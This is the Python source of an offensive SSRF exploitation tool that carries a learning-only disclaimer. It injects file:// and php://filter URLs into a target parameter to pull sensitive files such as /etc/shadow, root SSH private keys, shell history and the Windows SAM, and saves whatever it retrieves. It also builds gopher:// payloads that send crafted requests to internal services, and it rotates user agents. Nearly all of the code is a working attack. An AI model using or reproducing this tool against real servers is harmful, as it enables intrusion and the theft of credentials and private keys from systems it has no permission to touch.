#!/usr/bin/python3
# @Мартин.
import sys,argparse,textwrap,requests,re,random,os
from loguru import logger
import urllib.parse

Version = "@Мартин. SSRF Tool V1.1.0"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Logo=f'''
 ███▄ ▄███▓     ██████      ██████     ██▀███       █████▒
▓██▒▀█▀ ██▒   ▒██    ▒    ▒██    ▒    ▓██ ▒ ██▒   ▓██   ▒ 
▓██    ▓██░   ░ ▓██▄      ░ ▓██▄      ▓██ ░▄█ ▒   ▒████ ░ 
▒██    ▒██      ▒   ██▒     ▒   ██▒   ▒██▀▀█▄     ░▓█▒  ░ 
▒██▒   ░██▒   ▒██████▒▒   ▒██████▒▒   ░██▓ ▒██▒   ░▒█░    
░ ▒░   ░  ░   ▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░   ░ ▒▓ ░▒▓░    ▒ ░    
░  ░      ░   ░ ░▒  ░ ░   ░ ░▒  ░ ░     ░▒ ░ ▒░    ░      
░      ░      ░  ░  ░     ░  ░  ░       ░░   ░     ░ ░    
       ░            ░           ░        ░                
                                                          
                Github==>https://github.com/MartinxMax    
                {Version}  '''


def Init_Loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


class Main_Class():
    def __init__(self,args):
        self.URL=args.URL
        self.INFO= args.INFO
        self.EXP=args.EXP
        self.TYPE = args.TYPE
        self.Linux_DIR = ["/root/.ssh/authorized_keys", "/root/.ssh/id_rsa", "/root/.ssh/id_ras.keystore",
                 "/root/.ssh/known_hosts", "/etc/passwd", "/etc/shadow", "/etc/my.cnf", "/etc/httpd/conf/httpd.conf",
                 "/root/.bash_history", "/root/.mysql_history", "/proc/mounts", "/porc/config.gz",
                 "/var/lib/mlocate/mlocate.db", "/porc/self/cmdline","/flag","/etc/flag","/var/www/html/flag.php","/tmp/flag.php"]
        self.Windows_DIR = ["C:\\boot.ini", "C:\\Windows\\System32\\inetsrv\\MetaBase.xml", "C:\\Windows\\repair\\sam",
                   "C:\\Program Files\mysql\\my.ini", "C:\\Program Files\\mysql\\data\\mysql\\user.MYD", "C:\\Windows\\php.ini",
                   "C:\\Windows\\my.ini", "C:\\Windows\\win.ini"]
        self.User_Agents =[
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0',
                'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.0 Mobile/14F89 Safari/602.1'
            ]


    def run(self):
        if self.URL and "*" in self.URL:
            self.Domain = re.search(r'(?<=//)[^/]+', self.URL).group().replace(':','_')
            if self.INFO:
                self.Server_Types=self.Server_Type()
                logger.info("Test File Protocol...")
                self.Server_Info(self.Server_Types,Protocol="file://")
                logger.info("Test PHP Protocol...")
                self.Server_Info(self.Server_Types, Protocol="php://filter/read=convert.base64-encode/resource=")
                logger.warning("Test completed")
            if self.EXP:
                self.Send_Payload(self.Build_Payload())
        else:
            logger.error("You must fill in the correct parameters")


    def Server_Type(self):
        if 'win' in self.TYPE.lower() :
            logger.warning("You force the specified server to be a Windows operating system")
            return 0
        elif 'lin' in self.TYPE.lower():
            logger.warning("You force the specified server to be a Linux operating system")
            return 1
        logger.info("Detecting server type...")
        try:
            response = requests.get(self.URL.split('?')[0], headers={'User-Agent': random.choice(self.User_Agents)},timeout=5)
        except:
            logger.error("There is a problem with the network")
            return False
        else:
            if response.status_code == 200:
                server = response.headers['Server']
                logger.info("[Middleware] " + server)
                if 'Windows' in server:
                    logger.info("Maybe it's a [Windows] operating system")
                    return 0
                else:
                    logger.info("Maybe it's a [Linux] operating system")
                    return 1
            else:
                logger.error("[Request exception]")
                return False


    def Server_Info(self, Flag=False,Protocol=None):
        if not self.Get_Error_Page_Lenght(Protocol) :
            return False
        else:
            if Flag == 0:
                dirs = self.Windows_DIR
                sep = '\\'
            elif Flag == 1:
                dirs = self.Linux_DIR
                sep = '/'
            else:
                return False
            for DIR in dirs:
                try:
                    result = requests.get(self.URL.replace("*", Protocol + DIR), timeout=2,
                                          headers={'User-Agent': random.choice(self.User_Agents)})
                except:
                    logger.error(f"Failed to obtain sensitive information [{DIR}]")
                else:
                    if self.Page_Lenght != len(result.text):
                        logger.warning(f"Successfully obtained sensitive information [{DIR}]")
                        self.Save_Log(f"./{self.Domain}/" + DIR.split(sep)[-1] + ".txt", result.text)
                    else:
                        logger.error(f"No sensitive files were found on this server [{DIR}]")



    def Get_Error_Page_Lenght(self,Protocol):
        try:
            result = requests.get(self.URL.replace("*", Protocol+"Martin"), timeout=2,headers={'User-Agent': random.choice(self.User_Agents)})
        except:
            logger.error("Unable to get error page length")
            return False
        else:
            if result.status_code == 200:
                self.Page_Lenght=len(result.text)
                logger.warning(f"[Error Page Lenght] [{self.Page_Lenght}]")
                return True
            else:
                logger.error("The request cannot reach the server, unable to obtain the page length")


    def Build_Payload(self):
        logger.info("PAYLOAD Loading ...")
        try:
            with open('Request.conf','r+',encoding='utf-8')as f:
                note = f.read()
        except:
            logger.error("Unable to find Request.conf file")
            return False
        else:
            if not note:
                logger.error("Unable to load PAYLOAD")
                return None
            else:
                logger.warning("PAYLOAD loaded successfully")
                Head_PAYLOAD = urllib.parse.quote(note).replace("%0A", "%0D%0A")
                Host = re.search(r'^Host:\s*(.*?)$', note,re.MULTILINE).group(1)
                PAYLOAD = "gopher://"+Host+"/_"+urllib.parse.quote(Head_PAYLOAD)
                return PAYLOAD


    def Send_Payload(self,payload=None):
        if payload:
            logger.warning("\n[PAYLOAD]\n" +self.URL.replace("*", payload))
            logger.info("[Try SSRF...]")
            try:
                status = requests.get(self.URL.replace("*", payload),headers={'User-Agent': random.choice(self.User_Agents)},timeout=10)
            except:
                logger.error("Problems with SSRF!")
                return False
            else:
                if status.text:
                    logger.warning(f"\n[SSRF_RESULT] [Request_Status_Code:{status.status_code}]\n"+status.text)
                else:
                    logger.error("The exploit seems to have failed")
                return True
        else:
            return False


    def Save_Log(self,path,data):
        dir_name = os.path.dirname(path)
        file_name = os.path.basename(path)
        if not os.path.exists(dir_name):
            os.makedirs(dir_name)
        try:
            with open(os.path.join(dir_name, file_name), 'w') as f:
                f.write(data)
        except:
            logger.error("Error in log file")
        else:
            return True


def main():
    print(Logo,"\n",Title)
    Init_Loger()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Basic usage:
            python3 {MPHP} -url http://xxx.com?a=* -exp #Conduct an attack
            python3 {MPHP} -url http://xxx.com?a=* -info # Server sensitive information collection
            python3 {MPHP} -url http://xxx.com?a=* -info -type(windows) #Specify the host operating system
            
            '''.format(MPHP = sys.argv[0]
                )))
    parser.add_argument('-url', '--URL',default='', help='Target_URL')
    parser.add_argument('-info', '--INFO',action='store_true', help='Server_INFO')
    parser.add_argument('-type', '--TYPE', default='', help='Server_Type')
    parser.add_argument('-exp', '--EXP', action='store_true', help='Exploit')
    args = parser.parse_args()
    Main_Class(args).run()


if __name__ == '__main__':
    main()
